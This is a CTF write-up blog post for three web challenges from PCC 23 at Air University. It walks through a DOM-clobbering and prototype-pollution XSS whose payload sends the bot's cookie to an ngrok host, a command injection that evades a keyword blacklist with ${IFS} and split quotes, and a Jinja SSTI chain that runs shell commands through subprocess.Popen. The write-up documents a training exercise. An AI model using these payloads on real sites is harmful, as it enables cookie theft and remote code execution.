---
title: Writeups for Web challenges from 23 PCC
tags:
  - pcc23
  - ctf
categories:
  - CTF
  - Writeups
summary: These are the writeups for web challenges from PCC 23 held at Air University Islamabad  
created: 2023-12-22
lastmod: 2023-12-22
image: https://github.com/hash3liZer/khatta/assets/29171692/661f1693-25ee-4ea3-8599-635e7b73cb6e
---

# Qualifiers
### Secure ME

The challenge had the following instruction and one attachment: 

> It's just an application to secure your profile. What can possibly go wrong

On the first review, the website seems to simply return a `Resolution ID` when details are submitted. There's nothing more here. 

![image](https://github.com/hash3liZer/khatta/assets/29171692/52943339-b80e-4e25-b7f3-cec5e264f91c)

So, lets review the attachment now. We find that we actually have 3 endpoints: 
```
/save
/:resolution
/view/:resolution
```

Lets check the resolution endpoint. The resolution page is rendered with our provided values. So, lets view the url. 
```javascript
app.get("/:resolution", (req, res) => {
  const resolution = resolutions.get(req.params.resolution);
  if (!resolution) return res.status(404).send("not found");

  res.render("resolutions", {
    id: req.params.resolution,
    name: encodeURIComponent(resolution.name),
    description: encodeURIComponent(resolution.description),
  });
});
```

![image](https://github.com/hash3liZer/khatta/assets/29171692/2269cc03-ac04-4e80-a1f7-fe2e5ad7ebc3)

The page provides the link to `/view/:resolution` where the resolution page is visited through puppeteer. So, jump back to the flag part. The flag is attached in the cookie on the resolution page: 
```javascript
ctx = await (await browser).createIncognitoBrowserContext();
const visit = async (browser, resolution) => {
  const page = await browser.newPage();
  await page.goto("http://localhost:8000");
  await page.setCookie({ name: "pcc", value: process.env.FLAG });
  await page.goto(`http://localhost:8000/${resolution}`);
  await page.waitForNetworkIdle({ timeout: 6000 });
  await page.close();
};
```

So, if we could get the `XSS` on resolution page. We can capture the flag from cookie. Lets revisit our resolution page code: 
```html
<body>
    <div class="container">
    <div class="alert alert-success p-4" id="alert" role="alert">
        <h4 class="alert-heading">Well done!</h4>
        <p id="name"></p><hr>
        <p id="resolution" class="mb-0"></p>
    </div>
    </div>
    <script>
        let name = document.getElementById("name")
        let res   = document.getElementById("resolution")
        name.innerHTML = DOMPurify.sanitize(decodeURIComponent(`Shameer`));
        class Maker {
            #is_safe;
            constructor(is_safe = true) {this.#is_safe = is_safe}
            get is_safe() {return this.#is_safe;}
        }

        async function firemeup() {
            let top = null;
            if (window.facecard?.top) {
                let res = await fetch(window.facecard?.top.toString());
                top = await res.json();
            }
            const facecard = Object.assign(new Maker(true), top ?? { report: true });
            let body = decodeURIComponent(`Its%20me`);
            if (facecard.report) {
                let box = document.getElementById("alert");
                const newelem = document.createElement("a");
                newelem.innerHTML = `Your Resolution`;
                newelem.href = `view/RRnYXuQ-hNEOPQpT_E-ey`;
                newelem.style.marginTop = "10px";
                newelem.style.display = "block"
                box.appendChild(newelem)
            }
            res.innerHTML = (window.debug && !facecard.is_safe) ? body : DOMPurify.sanitize(body);
        }
        firemeup();
    </script>
```

Upon reviewing it closely, we have 2 vulnerability in this code: 

* HTML Injection. Altough the input is sanitized using `Dompurify` we can still provide html input. This would lead us to **DOM Clobbering**. We can define an anchor tag with id `facecard` and execute the code under this condition:
```javascript
if (window.facecard?.top) {
    let res = await fetch(window.facecard?.top.toString());
    top = await res.json();
}
```

* Prototype Pollution. The `top` variable value is passed to `Object.assign` function. If we can provide an object `__proto__` element, we can modify the created object in our own way.
```
const facecard = Object.assign(new Maker(true), top ?? { report: true });
```

Now one challenge here could be that the since we are going to overwrite the value of `is_safe` attribute, it might not be possible after all since its a private member declared with a `#` in the beginning. But we can also skip this element providing an prototype leading to an `undefined` behavior. 

So, lets fire up a python server and return a `__proto__` object:
```python
import http.server
import json

class handle_request(http.server.BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()

    def do_GET(self):
        response = {
            "__proto__": {  
            "report": True
          }
        }
        self._set_headers()
        self.wfile.write(json.dumps(response).encode())

server = http.server.HTTPServer(('', 9000), handle_request)
server.serve_forever()
```

Proxy your server through ngrok or another tool:
```bash
$ ngrok http 9000
```

Lets craft our final payload now. Before we do, we still have one thing missing. At the end of the code, the condition to render our payload without using `DOMPurify` is: 
```
(window.debug && !facecard.is_safe) ? body : DOMPurify.sanitize(body);
```

In addition, we need to declare another variable on window element which is `debug`. In the **name** field, we will provide our DOM Clobbering code: 
```html
<div id=debug></div><a id=facecard><a id=facecard name=top href='https://de31-101-50-78-56.ngrok-free.app'>
```

And XSS in the description: 
```html
<img src=x onerror='fetch("https://de31-101-50-78-56.ngrok-free.app/" + document.cookie)' />
```

When you submit the details and revisit the resolution page, you will get the flag on your ngrok terminal. 

![image](https://github.com/hash3liZer/khatta/assets/29171692/5e230929-31fa-4c09-9cc1-bfe2dba9c653)

# Finals
### JazzME

The challenge had the following description:

> Taqi is a big fan of Jazz. I made him try my new jazz application.

And beleive me Taqi (theflash2k) is only the fan of Jazz Office. 

The app is rather simple, if i enter my name, i get it returned in plain. Lets try different payloads. And there's a hit at command injection: 

![image](https://github.com/hash3liZer/khatta/assets/29171692/99cfcbfa-944f-41e2-84dd-31cdf8673ba4)

Seems we are inside a string and on top of that we are `root`. Lets read the flag which is prolly sitting in the same directory or at `/flag.txt`. But it seems there's a blacklist filtering: 

![image](https://github.com/hash3liZer/khatta/assets/29171692/16526814-4af4-42d6-bedc-8dc4daea661c)

So, lets start putting our command one by one, so we can see what's allowed and what's not with the website response. After testing command one by one, the filtered keywords seems to be are **space**, **flag** and **txt** extension. Since, spaces are not allowed, we can also use `${IFS}` in place of that. 

Thats a good start. But we also know that in linux we can provide empty strings within a word. Like `fla""g` would be a valid word. Combining these 2 condition, our final payload would look like: 
```python
$(cat${IFS}/fla""g.t""xt)
```

And we enter it and we get the flag: 
![image](https://github.com/hash3liZer/khatta/assets/29171692/ee099921-82c2-4a08-a59e-57f688ab9638)

### Lama

The challenge had the following description: 

> Taqi made a basic web chall, no way you can do this one.

Lets visit our application and we found an entry at `/robots.txt`: 

![image](https://github.com/hash3liZer/khatta/assets/29171692/e1e68f55-784e-4f83-961d-2ef41408f90b)

Lets visit the disallowed URL and it seems to be returning the entered value at the endpoint: 

![image](https://github.com/hash3liZer/khatta/assets/29171692/4dc04931-ecf2-4b47-bf79-5fcdc7f61f32)

Upon sending the request through curl, the server is based on Python and we can try an `SSTI` here: 

![image](https://github.com/hash3liZer/khatta/assets/29171692/a9215dc0-35ea-4023-a599-d659b49220db)

Enter the payload `{{7*7}}` returns me the valid response. From here, we have a lot of public writeups available. Our goal is to read the flag inside `flag.txt` file. First, lets enumerate the `object` class with: 
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

We find the `subprocess.Popen` function. But first we need to find its index. You can enumerate it through the url directly by slicing the returned list. Keep repeating the step until you find the right index: 
```python
{{''.__class__.__mro__[1].__subclasses__()[203:]}}
```

You can find the index at `367`:

![image](https://github.com/hash3liZer/khatta/assets/29171692/fa9ecdbf-0051-4e23-8d48-6c5f13743fea)

And execute the command: 
```python
{{''.__class__.__mro__[1].__subclasses__()[367]('whoami',shell=True,stdout=-1).communicate()}}****
```

But while reading the flag, we get the command is filtered. Lets apply the same technique we did in the previous challenge and we get the response `Invalid Flag`: 
```python
{{''.__class__.__mro__[1].__subclasses__()[367]('cat${IFS}fla""g.t""xt',shell=True,stdout=-1).communicate()}}
```

It seems as if the returned response is being also filtered. We can simply cut the first 3 letters and try to capture the flag: 

```python
{{''.__class__.__mro__[1].__subclasses__()[367]('cat${IFS}fla""g.t""xt|cut${IFS}-b4-',shell=True,stdout=-1).communicate()}}
```

![image](https://github.com/hash3liZer/khatta/assets/29171692/6fc7a331-f73f-44a3-8440-dc7c33af692f)


